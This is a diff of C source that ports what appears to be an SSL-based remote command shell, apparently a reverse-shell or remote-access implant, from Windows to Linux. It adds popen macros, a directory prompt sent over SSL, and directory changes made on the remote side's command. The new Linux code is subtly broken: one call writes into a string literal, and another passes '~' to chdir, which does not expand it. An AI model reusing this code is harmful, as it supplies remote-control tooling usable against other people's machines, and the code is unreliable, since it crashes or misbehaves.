@@ -1,7 +1,14 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdbool.h>
-#include <Shlobj.h>
+
+#ifdef WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#define _popen(command, type) popen(command, type)
+#define _pclose(stream) pclose(stream)
+#endif
 
 #include "shell.h"
 #include "utils.h"
@@ -73,6 +80,7 @@ void SSL_shell(SSL *ssl)
     }
 }
 
+#ifdef WIN32
 void send_cwd(SSL *ssl)
 {
     char path[MAX_PATH];
@@ -91,7 +99,10 @@ bool change_directory(const char *dir)
     // if they only typed "cd"
     if (dir == NULL)
     {
-        if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
+        //if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
+        // ^ x86_64-w64-mingw32-gcc doesn't like shlobj.h 
+        
+        if (GetEnvironmentVariableA("USERPROFILE", path, MAX_PATH) > 0)
         {
             if (SetCurrentDirectoryA(path))
             {
@@ -108,3 +119,43 @@ bool change_directory(const char *dir)
     }
     return false;
 }
+
+#else
+void send_cwd(SSL *ssl)
+{
+    char path[4096]; // size of PATH_MAX
+
+    if (getcwd(path, sizeof(path)) != NULL)
+    {
+        // check if there is enoug space to add "> "
+        if (strlen(path) + strlen("> ") < sizeof(path))
+        {
+            strcat(path, "> ");
+        }
+    }
+    else
+    {
+        strcat("getcwd() error\n", path);
+    }
+    
+    SSL_write(ssl, path, strlen(path));
+}
+
+bool change_directory(const char *dir)
+{
+    if (dir == NULL)
+    {
+        if(chdir("~") == 0) 
+        {
+            return true;
+        }
+        return false;
+    }
+
+    if (chdir(dir) == 0)
+    {
+        return true;
+    }
+    return false;
+}
+#endif
